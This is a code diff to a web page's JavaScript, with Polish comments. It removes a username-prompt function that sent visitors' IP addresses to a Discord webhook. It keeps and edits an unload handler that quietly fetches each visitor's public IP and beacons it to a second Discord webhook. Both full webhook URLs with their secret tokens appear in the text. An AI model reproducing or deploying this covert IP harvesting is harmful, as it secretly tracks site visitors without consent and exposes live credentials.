@@ -358,47 +358,13 @@
 </script>
 
 <script>
-  let username = "--"; // Domyślnie ustawiamy nazwę na "--"
-
-  // Funkcja wysyłająca dane do webhooka
-  function submitUser() {
-    const inputUsername = document.getElementById("username").value;
-    if (inputUsername) {
-      username = inputUsername;
-    }
-
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        const payload = {
-          content: `👀 Nowe wejście na stronę:\n🧑‍💻 Nazwa: ${username}\n🌍 IP: ${ip}`
-        };
-
-        fetch("https://discord.com/api/webhooks/1364632834236743740/lmC7HhXBVzE4snxn9tPaolCHagVYZg5hwlNiHmhL_yAwM8wGMKTmMwSlb3hJdJMG-r2_", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
-
-        document.getElementById("popup").style.display = "none"; // Ukrycie popupu po zatwierdzeniu
-      })
-      .catch(err => {
-        alert("Nie udało się pobrać IP.");
-        console.error(err);
-      });
-  }
-
-  // Wysłanie IP przy opuszczeniu strony - nawet przy szybkim zamknięciu karty
   window.addEventListener("unload", function() {
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
         const ip = data.ip;
         const payload = {
-          content: `👀 Użytkownik opuścił stronę bez wprowadzenia nazwy:\n🧑‍💻 Nazwa: --\n🌍 IP: ${ip}`
+          content: `nowe wejscie na strone: \n🌍 IP: ${ip}`
         };
 
         navigator.sendBeacon("https://discord.com/api/webhooks/1373021653662961805/sEOdQV-9f0QeOeEfM96PchuwiHdlftvE4r9tQ-yFnPVJg_Nz9s-dONLZsgPxuXDcvQbo", JSON.stringify(payload));
